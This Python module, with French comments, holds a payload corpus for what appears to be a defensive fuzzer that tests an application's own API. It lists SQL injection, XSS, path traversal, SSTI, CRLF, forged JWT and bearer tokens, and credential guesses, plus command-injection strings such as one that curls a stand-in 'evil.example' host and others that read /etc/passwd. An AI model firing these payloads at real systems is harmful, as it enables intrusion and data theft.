"""Corpus d'attaque — payloads malveillants par catégorie.

Chaque payload est croisé par le moteur avec chaque route et chaque point d'injection
(chemin, query, header, corps JSON), ce qui produit des milliers de requêtes. Le corpus
est volontairement extensible : ajouter une chaîne ici élargit la couverture partout.
"""
from __future__ import annotations

# ── Injections classiques ────────────────────────────────────────────────────────────────
SQL_INJECTION = [
    "' OR '1'='1",
    "'; DROP TABLE sessions;--",
    "1' UNION SELECT token FROM sessions--",
    "admin'--",
    "' OR 1=1--",
    "\") OR (\"1\"=\"1",
    "'; SELECT * FROM user_links;--",
]

XSS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>",
    "'\"><body onload=alert(1)>",
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd\x00.png",
    "..%c0%af..%c0%afetc/passwd",
]

COMMAND_INJECTION = [
    "; cat /etc/passwd",
    "| whoami",
    "$(id)",
    "`id`",
    "&& curl http://evil.example",
    "\n/bin/sh",
]

TEMPLATE_SSTI = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}"]

# ── Fuzzing / entrées limites ──────────────────────────────────────────────────────────────
OVERSIZED = ["A" * 10_000, "💥" * 5_000, "0" * 100_000]
UNICODE_CONTROL = [
    "\x00\x01\x02\x03",
    "‮‭RTL override",
    "𝕏𝕏𝕏﻿",
    "\r\nSet-Cookie: injected=1",   # header/CRLF injection
    "\n\nHTTP/1.1 200 OK",
    "ﬀ" * 200,
]
TYPE_CONFUSION = [None, True, False, 0, -1, 2**63, [1, 2, 3], {"$ne": None}, {"__proto__": {"x": 1}}]

# ── Attaques d'authentification / bypass ──────────────────────────────────────────────────
FORGED_BEARER = [
    "Bearer null",
    "Bearer undefined",
    "Bearer " + "a" * 43,                      # jeton de session inexistant
    "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",  # JWT alg=none
    "Bearer ' OR '1'='1",
    "bearer admin",
]
ADMIN_SECRET_GUESS = ["", "admin", "secret", "password", "changeme", "0" * 32, "true", "null"]
TOTP_GUESS = ["000000", "123456", "111111", "999999", "", "abcdef", "0000000"]
VISITOR_ID_ABUSE = ["", "a", "x" * 65, "../../etc", "' OR 1=1", "\x00", "admin"]

# Points d'injection d'un token de session dans l'URL (fuite connue à ne pas rouvrir).
URL_TOKEN_KEYS = ["token", "aria_token", "secret"]

# ── Corpus agrégé pour les champs génériques (path/query/body string) ─────────────────────
GENERIC_STRINGS: list[str] = (
    SQL_INJECTION
    + XSS
    + PATH_TRAVERSAL
    + COMMAND_INJECTION
    + TEMPLATE_SSTI
    + OVERSIZED
    + UNICODE_CONTROL
)


def all_categories() -> dict[str, list]:
    """Vue nommée du corpus (pour le rapport)."""
    return {
        "sql_injection": SQL_INJECTION,
        "xss": XSS,
        "path_traversal": PATH_TRAVERSAL,
        "command_injection": COMMAND_INJECTION,
        "template_ssti": TEMPLATE_SSTI,
        "oversized": OVERSIZED,
        "unicode_control": UNICODE_CONTROL,
        "type_confusion": TYPE_CONFUSION,
        "forged_bearer": FORGED_BEARER,
        "admin_secret_guess": ADMIN_SECRET_GUESS,
        "totp_guess": TOTP_GUESS,
        "visitor_id_abuse": VISITOR_ID_ABUSE,
    }
